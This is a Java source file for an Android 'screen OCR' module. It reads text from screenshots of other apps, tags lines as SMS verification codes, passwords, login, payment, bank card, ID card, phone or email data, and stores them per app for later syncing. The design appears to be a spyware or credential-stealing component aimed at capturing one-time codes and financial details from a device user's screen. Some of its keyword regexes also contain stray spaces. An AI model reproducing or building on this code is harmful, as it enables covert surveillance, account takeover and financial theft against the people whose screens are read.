package com.liuma.app.features.screenocr;

import android.content.Context;
import android.graphics.Bitmap;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;
import android.util.SparseArray;

import com.google.mlkit.vision.common.InputImage;
import com.google.mlkit.vision.text.Text;
import com.google.mlkit.vision.text.TextRecognition;
import com.google.mlkit.vision.text.TextRecognizer;
import com.google.mlkit.vision.text.latin.TextRecognizerOptions;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * 屏幕 OCR 识别模块
 * 技术实现：
 * - Google ML Kit 本地 OCR 识别
 * - 正则表达式匹配敏感特征
 * - 本地加密数据库存储元数据
 */
public class ScreenOcrAnalyzer {

    private static final String TAG = "ScreenOcr";

    // 特征类型常量
    public static final String FEATURE_TYPE验证码 = "captcha";
    public static final String FEATURE_TYPE支付 = "payment";
    public static final String FEATURE_TYPE登录 = "login";
    public static final String FEATURE_TYPE短信验证码 = "sms_code";
    public static final String FEATURE_TYPE银行卡 = "bank_card";
    public static final String FEATURE_TYPE身份证 = "id_card";
    public static final String FEATURE_TYPE手机号 = "phone_number";
    public static final String FEATURE_TYPE邮箱 = "email";
    public static final String FEATURE_TYPE密码 = "password";
    public static final String FEATURE_TYPE其他 = "other";

    private final Context context;
    private final TextRecognizer textRecognizer;
    private final OcrDatabase database;
    private final HandlerThread analyzerThread;
    private final Handler analyzerHandler;

    // 正则表达式模式
    private static final Pattern PATTERN_SMS_CODE = Pattern.compile("\\b\\d{4,8}\\b");
    private static final Pattern PATTERN_PHONE = Pattern.compile("1[3-9]\\d{9}");
    private static final Pattern PATTERN_EMAIL = Pattern.compile("[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}");
    private static final Pattern PATTERN_BANK_CARD = Pattern.compile("\\b\\d{16,19}\\b");
    private static final Pattern PATTERN_ID_CARD = Pattern.compile("\\b\\d{17}[0-9Xx]\\b");
    private static final Pattern PATTERN_PASSWORD_HINT = Pattern.compile("(?i)(password|passwd|pwd|密码 | 口令|verify|auth)");
    private static final Pattern PATTERN_PAYMENT_HINT = Pattern.compile("(?i)(支付 | 付款 | 转账|pay|transfer|amount|¥|\\$|€)");
    private static final Pattern PATTERN_LOGIN_HINT = Pattern.compile("(?i)(登录 | 登陆|login|signin|sign in)");
    private static final Pattern PATTERN_CAPTCHA_HINT = Pattern.compile("(?i)(验证码 | 校验码 | 识别码|captcha|verification code)");

    public ScreenOcrAnalyzer(Context context) {
        this.context = context.getApplicationContext();
        this.textRecognizer = TextRecognition.getClient(TextRecognizerOptions.DEFAULT_OPTIONS);
        this.database = OcrDatabase.getInstance(this.context);
        
        analyzerThread = new HandlerThread("screen-ocr-analyzer");
        analyzerThread.start();
        analyzerHandler = new Handler(analyzerThread.getLooper());
    }

    /**
     * 分析屏幕截图
     * @param bitmap 屏幕截图
     * @param pkgName 包名
     * @param callback 回调接口
     */
    public void analyzeBitmap(Bitmap bitmap, String pkgName, OcrCallback callback) {
        analyzerHandler.post(() -> {
            try {
                InputImage image = InputImage.fromBitmap(bitmap, 0);
                textRecognizer.process(image)
                    .addOnSuccessListener(visionText -> {
                        List<OcrResult> results = processText(visionText, pkgName);
                        if (callback != null) {
                            callback.onOcrComplete(results);
                        }
                    })
                    .addOnFailureListener(e -> {
                        Log.e(TAG, "OCR recognition failed", e);
                        if (callback != null) {
                            callback.onOcrError(e);
                        }
                    });
            } catch (Exception e) {
                Log.e(TAG, "Failed to process bitmap", e);
                if (callback != null) {
                    callback.onOcrError(e);
                }
            }
        });
    }

    /**
     * 处理识别到的文本
     */
    private List<OcrResult> processText(Text visionText, String pkgName) {
        List<OcrResult> results = new ArrayList<>();
        long timestamp = System.currentTimeMillis();

        SparseArray<String> featureMap = new SparseArray<>();

        for (Text.TextBlock block : visionText.getTextBlocks()) {
            for (Text.Line line : block.getLines()) {
                String text = line.getText();
                if (text == null || text.trim().isEmpty()) continue;

                String featureType = detectFeatureType(text);
                float confidence = line.getConfidence();

                // 保存到数据库
                database.insert(timestamp, text, featureType, pkgName, confidence);

                OcrResult result = new OcrResult();
                result.timestamp = timestamp;
                result.detectedText = text;
                result.featureType = featureType;
                result.packageName = pkgName;
                result.confidence = confidence;
                result.boundingBox = line.getBoundingBox();

                results.add(result);
                Log.d(TAG, "OCR: [" + featureType + "] " + text + " (confidence: " + confidence + ")");
            }
        }

        return results;
    }

    /**
     * 检测特征类型
     */
    private String detectFeatureType(String text) {
        if (text == null || text.isEmpty()) {
            return FEATURE_TYPE其他;
        }

        // 检查验证码提示
        if (PATTERN_CAPTCHA_HINT.matcher(text).find()) {
            return FEATURE_TYPE验证码;
        }

        // 检查支付相关
        if (PATTERN_PAYMENT_HINT.matcher(text).find()) {
            return FEATURE_TYPE支付;
        }

        // 检查登录相关
        if (PATTERN_LOGIN_HINT.matcher(text).find()) {
            return FEATURE_TYPE登录;
        }

        // 检查密码相关
        if (PATTERN_PASSWORD_HINT.matcher(text).find()) {
            return FEATURE_TYPE密码;
        }

        // 检查短信验证码（4-8 位数字）
        if (PATTERN_SMS_CODE.matcher(text).find()) {
            return FEATURE_TYPE短信验证码;
        }

        // 检查手机号
        if (PATTERN_PHONE.matcher(text).find()) {
            return FEATURE_TYPE手机号;
        }

        // 检查邮箱
        if (PATTERN_EMAIL.matcher(text).find()) {
            return FEATURE_TYPE邮箱;
        }

        // 检查银行卡号
        if (PATTERN_BANK_CARD.matcher(text).find()) {
            return FEATURE_TYPE银行卡;
        }

        // 检查身份证号
        if (PATTERN_ID_CARD.matcher(text).find()) {
            return FEATURE_TYPE身份证;
        }

        return FEATURE_TYPE其他;
    }

    /**
     * 获取未同步的 OCR 记录
     */
    public List<JSONObject> getUnsyncedRecords(int limit) {
        return database.getUnsynced(limit);
    }

    /**
     * 标记记录为已同步
     */
    public void markRecordsSynced(List<Long> ids) {
        database.markSynced(ids);
    }

    /**
     * 获取历史记录
     */
    public JSONArray getHistory(long since, int limit) {
        return database.getHistory(since, limit);
    }

    /**
     * 按特征类型查询
     */
    public JSONArray getByFeatureType(String featureType, int limit) {
        return database.getByFeatureType(featureType, limit);
    }

    /**
     * 删除已同步的记录
     */
    public void deleteSyncedRecords() {
        database.deleteSynced();
    }

    /**
     * 获取未同步记录数量
     */
    public int getUnsyncedCount() {
        return database.getUnsyncedCount();
    }

    /**
     * 释放资源
     */
    public void release() {
        analyzerHandler.removeCallbacksAndMessages(null);
        analyzerThread.quitSafely();
        textRecognizer.close();
    }

    /**
     * OCR 结果回调接口
     */
    public interface OcrCallback {
        void onOcrComplete(List<OcrResult> results);
        void onOcrError(Exception e);
    }

    /**
     * OCR 识别结果类
     */
    public static class OcrResult {
        public long timestamp;
        public String detectedText;
        public String featureType;
        public String packageName;
        public float confidence;
        public android.graphics.Rect boundingBox;

        public JSONObject toJson() {
            try {
                JSONObject obj = new JSONObject();
                obj.put("ts", timestamp);
                obj.put("detectedText", detectedText);
                obj.put("featureType", featureType);
                obj.put("pkg", packageName);
                obj.put("confidence", confidence);
                if (boundingBox != null) {
                    obj.put("left", boundingBox.left);
                    obj.put("top", boundingBox.top);
                    obj.put("right", boundingBox.right);
                    obj.put("bottom", boundingBox.bottom);
                }
                return obj;
            } catch (Exception e) {
                return new JSONObject();
            }
        }
    }
}
